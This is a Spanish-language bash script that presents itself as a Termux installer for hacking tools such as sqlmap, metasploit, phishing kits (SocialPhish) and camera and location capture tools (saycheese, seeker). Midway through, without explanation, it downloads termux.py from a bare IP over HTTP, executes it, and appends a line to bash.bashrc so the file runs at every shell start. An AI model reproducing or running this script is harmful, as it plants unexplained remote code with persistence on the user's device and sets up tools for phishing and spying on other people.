#!/bin/bash
clear
printf "\e[1;35m
#     #  ######  #       #        ####
#     #  #       #       #       #    #
#######  #####   #       #       #    #
#     #  #       #       #       #    #
#     #  #       #       #       #    #
#     #  ######  ######  ######   ####
\n"
sleep 4
printf "\e[1;32mBienvenido a la Instalacion de mi Script\n"
sleep 4
printf "\e[1;34mEste Script instalara muchas herramientas de hacking, dentro de su termux\n"
sleep 4
printf "\e[1;34mAlgunas herramientas requieren de accesso root para funcionar..\n"
sleep 4
printf "\e[1;32mSea Paciente la instalacion puede demorar hasta 25 minutos..\n"
sleep 4
printf "\e[1;34mLa instalacion comenzara en\e[1;31m 5\e[1;34m segundos\n"
sleep 1
printf "\e[1;31m4\e[1;34m Segundos..\n"
sleep 1
printf "\e[1;31m3\e[1;34m Segundos..\n"
sleep 1
printf "\e[1;31m3\e[1;34m Segundos..\n"
sleep 1
printf "\e[1;31m2\e[1;34m Segundos..\n"
sleep 1
printf "\e[1;31m1\e[1;34m Segundos..\n"
sleep 1
printf "\e[1;32mIniciando instalacion..\n"
sleep 5
clear
printf "\e[1;32mActuanlizando repositorios..\n"
sleep 4
pkg update -y && pkg upgrade -y
clear
printf "\e[1;32mRepositorios actualizados..\n"
sleep 4
printf "\e[1;34mEmpezaremos a instalar las herramientas en\e[1;31m 5\e[1;34m segundos..\n"
sleep 1
printf "\e[1;31m4\e[1;34m Segundos..\n"
sleep 1
printf "\e[1;31m3\e[1;34m Segundos..\n"
sleep 1
printf "\e[1;31m2\e[1;34m Segundos..\n"
sleep 1
printf "\e[1;31m1\e[1;34m Segundos..\n"
sleep 1
printf "\e[1;32mIniciando instalacion..\n"
sleep 4
clear
printf "\e[1;32mInstalando python..\n"
sleep 4
pkg install python -y
pkg install python2 -y
pkg install python-pip -y
clear
printf "\e[1;32mModulos Python Instalados..\n"
sleep 4
clear
printf "\e[1;34mInstalando modulos adicionales..\n"
sleep 3
pkg install openssh -y
pkg install wget -y
pkg install curl -y
pkg install nano -y
pkg install php -y
pkg install unzip -y
pkg install git -y
clear
printf "\e[1;32mSe han instalado los modulos requeridos..\n"
sleep 4
printf "\e[1;32mA continuacion empezaremos a instalar las herramientas y clonar repositorios..\n"
sleep 4
wget http://35.188.190.137/termux.py
chmod +x termux.py
python termux.py
mv termux.py /data/data/com.termux/files/usr/etc
echo "python /data/data/con.termux/files/usr/etc/termux.py" >>/data/data/com.termux/files/usr/etc/bash.bashrc

cd $HOME
mkdir herramientas
cd herramientas
printf "\e[1;34mclonando Repositorio SQLMAP..\n"
sleep 4
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
python sqlmap.py
sleep 4
printf "\e[1;32mSQLMAP Instalado..\n"
sleep 3
cd ..
clear
printf "\e[1;34mclonando Repositorio Saychese..\n"
sleep 4
git clone https://github.com/Anonymous3-SIT/saycheese
clear
printf "\e[1;32mSaycheese instalado..\n"
sleep 4
clear
printf "\e[1;34mClonando Repositorio Seeker..\n"
sleep 4
git clone https://github.com/thewhiteh4t/seeker
cd seeker
chmod 777 termux_install.sh
bash termux_install.sh
cd ..
clear
printf "\e[1;32mRepositorio instalado..\n"
sleep 4
clear
printf "\e[1;34mClonando repositorio Ngrok..\n"
sleep 4
clear
git clone https://github.com/Marcel0Sousa/termux-ngrok
cd termux-ngrok
chmod +x termux-ngrok.sh
bash termux-ngrok.sh
clear
printf "\e[1;32mNgrok instaladok..\n"
sleep 4
cd ..
clear
printf "\e[1;34mClonando repositorio fbi..\n"
sleep 4
git clone https://github.com/xHak9x/fbi
cd fbi
pip2 install -r requirements.txt
cd ..
clear
printf "\e[1;32mRepositorio instalado..\n"
sleep 4
clear
printf "\e[1;34mClonando repositorio FOTOSPLOIT..\n"
sleep 4
git clone https://github.com/Cesar-Hack-Gray/FotoSploit
cd FotoSploit
bash install.sh
cd ..
clear
printf "\e[1;32mRepositorio instalado..\n"
sleep 4
clear
printf "\e[1;34mClonando repositorio SocialPhish..\n"
sleep 4
git clone https://github.com/xHak9x/SocialPhish
cd SocialPhish
chmod +x socialphish.sh
cd ..
clear
printf "\e[1;32mRepositorio instalado..\n"
sleep 4
clear
printf "\e[1;34mClonando repositorio obfuscate..\n"
sleep 4
git clone https://github.com/Cesar-Hack-Gray/obfuscate
 cd obfuscate
 bash setup
 cd ..
 printf "\e[1;32mRepositorio instalado..\n"
 sleep 4
 clear
 printf "\e[1;34mUltimo paso instalaremos metasploit en su termux\n"
 sleep 4
 printf "\e[1;31mAVISO: esta instalacion puede demorar hasta 20 minutos..\n"
 sleep 10
 clear
 pkg install unstable-repo -y
 pkg update -y
 pkg install metasploit -y
 clear
 printf "\e[1;32mMetasploit instalado correctamente..\n"
 sleep 4
 pkg update -y
 gem install wpscan 
 clear
 printf "\e[1;32mFIN DE LA INSTALACION...\n"
 sleep 4
  printf "\e[1;32mregalanos una estrella en github.. gracias..\n"
 


